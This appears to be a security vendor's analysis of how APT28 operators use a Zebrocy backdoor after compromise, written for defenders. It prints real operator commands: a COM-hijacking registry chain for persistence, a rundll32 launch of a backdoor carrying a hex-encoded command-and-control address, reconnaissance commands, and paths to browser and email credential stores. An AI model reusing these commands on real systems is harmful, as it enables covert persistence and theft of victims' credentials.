It’s a difficult question that is not possible to answer entirely by reverse\nengineering the code. In this article we will analyze commands sent by the operator to\ntheir targets.\n\nThe Sednit group – also known as APT28, Fancy Bear, Sofacy or STRONTIUM – has\nbeen operating since at least 2004 and has made headlines frequently in past years.\n\nRecently, we unveiled the existence of a UEFI rootkit, called [LoJax, which we attribute to](https://www.welivesecurity.com/2018/09/27/lojax-first-uefi-rootkit-found-wild-courtesy-sednit-group/)\nthe Sednit group. This is a first for an APT group, and shows Sednit has access to very\nsophisticated tools to conduct its espionage operations.\n\nThree years ago, the Sednit group unleashed new components targeting victims in\nvarious countries in the Middle East and Central Asia. Since then, the number and\ndiversity of components has increased drastically. [ESET](https://www.welivesecurity.com/2018/04/24/sednit-update-analysis-zebrocy/) [researchers and colleagues](https://www.welivesecurity.com/2018/11/20/sednit-whats-going-zebrocy/)\nfrom [other](https://securelist.com/masha-and-these-bears/84311/) [companies have documented these components; however, in this article we](https://unit42.paloaltonetworks.com/sofacy-creates-new-go-variant-of-zebrocy-tool/)\nwill focus on what’s beyond the compromise, what the operators do once a victim system\nis running a Zebrocy Delphi backdoor.\n\n# The bear’s bait\n\nAt the end of August 2018, the Sednit group launched a spearphishing email campaign\nwhere it distributed shortened URLs that delivered the first stage of Zebrocy\ncomponents. In the past, Sednit used a similar technique for [credential phishing.](https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf)\nHowever, it is unusual for the group to use this technique to deliver one of its malware\ncomponents directly. Previously, it had used exploits to deliver and execute the first\nstage malware, while in this campaign the group relied entirely on social engineering to\nlure victims into running the first part of the chain. The screenshot in Figure 1 shows Bitly\nstatistics for the shortened URL used in this campaign.\n\n\n-----\n\nFigure 1. Statistics of the Bitly URL\n\n\nAbout 20 clicks were recorded on this link in the same week that the URL was created,\nand these presumably downloaded the target archive. Let’s keep in mind that this may\nmean fewer than 20 potential victims, as victims may have clicked on the URL twice, or\nmaybe even more times, because the outcome was not what they expected… as we will\ndescribe below.\n\nWhile ESET telemetry data indicates that this URL was delivered by spearphishing\nemails, we don’t have a sample of such an email. The shortened URL leads the victim to\nan IP-address-based URL, where the archived payload is located.\n\nUnfortunately, without the email message, we don’t know if there are any instructions for\nthe user, if there is any further social engineering, or if it relies solely on the victim’s\ncuriosity. The archive contains two files; the first is an executable file, while the second is\na decoy PDF document.\n\nNote there is a typo in the\nexecutable’s filename; it should be\n“ДОВIДНИК” instead of\n“ДОВIДНIК”. Once the binary is\nexecuted, a password prompt\ndialog box opens. The result of the\npassword validation will always be\nwrong, but after the apparent\n\nFigure 2. Files extracted from the archive (Google Translate\n\nvalidation attempt, the decoy PDF suggests “CATALOGUE – (2018).exe” and “Order 97.pdf”\ndocument is opened. That from the Ukrainian)\ndocument appears to be empty,\nbut the downloader, which is\nwritten in Delphi, continues running in the background. The IP address is also used in\nthe URL hardcoded into the first binary downloader.\n\n\n# The bear’s lair\n\n\n-----\n\nThe Stage-1 downloader will download and execute a new downloader, written in C++,\nnot so different from other Zebrocy downloaders. Once again this downloader is as\nstraightforward as the Zebrocy gang’s other downloaders. It creates an ID and it\ndownloads a new, interesting backdoor, (this time) written in Delphi.\n\nAs we explained in our [most recent blogpost about Zebrocy, the configuration of the](https://www.welivesecurity.com/2018/11/20/sednit-whats-going-zebrocy/)\nbackdoor is stored in in the resource section and is split into four different hex-encoded,\nencrypted blobs. These blobs contain the different parts of the configuration.\n\n\nOnce the backdoor sends basic information\nabout its newly compromised system, the\noperators take control of the backdoor and start\nto send commands right away.\n\nHence, the time between the victim running the\ndownloader and the operators’ first commands\nis only a few minutes.\n\n\nFigure 3. Overview of the resource section\n\n\n-----\n\n-----\n\n# How the bear hunts\n\nIn this section we describe in more detail the commands performed manually by the\noperators through their Delphi backdoor.\n\nThe commands available are located in one of the configuration blobs mentioned earlier\n(the “commands” blob in Figure 3). The number of supported commands has increased\nover time, with the latest version of the backdoor having more than thirty. As we did not\nidentify a pattern in the order which the commands are invoked, we believe the\noperators are executing them manually.\n\nThe first set of commands gathers information about the victim’s computer and\nenvironment:\n\n**SCREENSHOT** **None**\n\n**SYS_INFO** **None**\n\n**GET_NETWORK** **None**\n\n**SCAN_ALL** **None**\n\nThe commands above are commonly executed when the operators first connect to a\nnewly activated backdoor. They don’t have any arguments, and they are quite selfexplanatory. Other commands commonly seen executed shortly after these backdoors\nare activated, listed below:\n\n\n**REG_GET_KEYS_‐**\n**VALUES**\n\n**DOWNLOAD_DAY(30)**\n\n**DOWNLOAD_DAY(1)**\n\n\nHKEY_CURRENT_USER\n\nSoftware\\Microsoft\\Windows\\CurrentVersion\n\nc:\\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg;*.jpeg;\n\n*.bmp;*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;*.lhz;\n\nd:\\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg;*.jpeg;\n\n*.bmp;*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;*.lhz;\n\nc:\\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg*.jpeg\n\n*.bmp*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;\n\nd:\\*.doc;*.docx;*.xls;*.xlsx;*.ppt;*.pptx;*.rtf;*.tif;*.tiff;*.jpg*.jpeg\n\n*.bmp*.rar;*.zip;*.pdf;*.KUM;*.kum;*.tlg;*.TLG;*.sbx;*.crf;*.hse;*.hsf;\n\n\n**CMD_EXECUTE** echo %APPDATA%\n\nipconfig /all\n\nnetstat -aon\n\n**CMD_EXECUTE** wmic process get Caption,ExecutablePath\n\nreg query\n\n\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /s\n\n\n-----\n\nThose who already have read our previous articles about Zebrocy will notice that more\nor less the same kind of information is sent, over and over again by previous stages.\nThis information is requested within a few minutes of initial compromise and the amount\nof data the operator will have to deal with is quite considerable.\n\nIn order to collect even more information, from time to time the Zebrocy operators upload\nand use dumpers on victims’ machines. The current dumpers have some similarities with\nthose previously used by the group. In this case, Yandex Browser, Chromium, 7Star\n_Browser (a Chromium-based browser), and CentBrowser are targeted, as well as_\nversions of Microsoft Outlook from 1997 through 2016:\n\n**UPLOAD_AND_EXECUTE_FILE** C:\\ProgramData\\Office\\MS\\msoffice.exe\n\n[…]\n\n4D5A9000…\n\nThese dumpers create log files indicating the presence or absence of potential\ndatabases to dump:\n\n**DOWNLOAD_LIST** C:\\ProgramData\\Office\\MS\\out.txt\n\nC:\\ProgramData\\Office\\MS\\text.txt\n\nThe current dumper contains the following output when there are no databases to dump:\n\n%LOCALAPPDATA%\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data not found\n\n%LOCALAPPDATA%\\Chromium\\User Data\\Default\\Login Data not found\n\n%LOCALAPPDATA%\\7Star\\7Star\\User Data\\Default\\Login Data not found\n\n%LOCALAPPDATA%\\CentBrowser\\User Data\\Default\\Login Data not found\n\nThese dumpers are quickly removed once they have done their job. Moreover, the\nbackdoor contains a list of filenames related to credentials from software listed below\n(database names):\n\nkey3.db Firefox private keys (now named key4.db)\n\ncert8.db Firefox certificate database\n\nlogins.json Firefox encrypted password database\n\naccount.cfn The Bat! (email client) account credentials\n\nwand.dat Opera password database\n\nThe operators take care of retrieving these databases if they are present on the victim’s\ncomputer.\n\n%APPDATA%\\The Bat!\\Account.CFN\n\n**DOWNLOAD_LIST** %APPDATA%\\The Bat!\\[REDACTED]\\Account.CFN\n\nThe operators retrieve these files on the machine using the DOWNLOAD_LIST\ncommand. This command can be used when the operators are aware of the presence of\ninteresting files on the computer.\n\n\n-----\n\nFinally, depending on how interesting the victim is, they malware operators may deploy\nanother custom backdoor. This backdoor is executed using the CMD_EXECUTE\ncommand:\n\n\n**Com‐**\n**mand**\n\n\n**Arguments**\n\n\n**CMD_**\n**EXE‐**\n1\n**CUTE**\n\n2\n\n3\n\n\nreg add \"HKCU\\Software\\Classes\\CLSID\\{0CD069CF-AC9B-41F4-95713A95A62C36A1}\" /ve /d \"Reliability Maintenance Control Panel\" /reg:64\n/f&&reg add \"HKCU\\Software\\Classes\\CLSID\\{0CD069CF-AC9B-41F49571-3A95A62C36A1}\\InProcServer32\" /ve /d\n\"%APPDATA%\\Microsoft\\WinSupport\\RMC\\mtrcpl.dll\" /reg:64 /f&&reg add\n\"HKCU\\Software\\Classes\\CLSID\\{0CD069CF-AC9B-41F4-95713A95A62C36A1}\\InProcServer32\" /v \"ThreadingModel\" /t REG_SZ /d\n\"Both\" /reg:64 /f\n\nrundll32.exe \"%APPDATA%\\Microsoft\\WinSupport\\RMC\\mtrcpl.dll\",#1\n687474703A2F2F[REDACTED]\n\ndir /s /b /o:gn %APPDATA%\\Microsoft\\\n\n\nThere are some interesting facts here. First, they use COM object hijacking to make the\nmalware persistent on the system even though the custom backdoor is installed only for\na few hours. Second, the hex-encoded string is the C&C used by the custom backdoor\nwhile in the Delphi backdoor the C&C is embedded in the configuration.\n\nThe two Delphi backdoors, the common one and the one above, are quite similar but\ncontain these interesting tweaks:\n\n**Delphi compiler version** 14.0-15.0 32.0\n\n**32/64-bit** 32-bit 64-bit\n\n\n**Configuration location** resource\nsection\n\n\nno config (C&C is passed as an\nargument)\n\n\n**Number of commands** 5 3\n\n**Encryption algorithm** AES ECB custom\n\n\n**Lifetime on the**\n**computer**\n\n\na few days a few hours\n\n\nOnce again, it’s not very clear what the purpose of this custom backdoor is. The\ndetection ratio is definitely lower in comparison to the “usual” backdoor. The very short\ntimeframe where this backdoor is on the system and operating makes it harder to\nretrieve. Once its operators complete their evil deeds, they quickly remove it.\n\n# Summary\n\n\n-----\n\nObserving commands used in the wild by the operator is quite interesting. They are\ngathering a considerable amount of information on the compromised target and they are\nnot worried about duplicated data. It shows a large gap between the development\nstrategy and what operators do in practice. Backdoors with custom configuration and\nmodules are deployed very carefully, which indicates some precautions to avoid ending\nup in the hands of researchers.\n\nThe first set of commands is the same and executed during a very short timeframe,\nwhich raises another question: is it automated?\n\n# Indicators of Compromise (IoCs)\n\nhttp://45.124.132[.]127/DOVIDNIK -
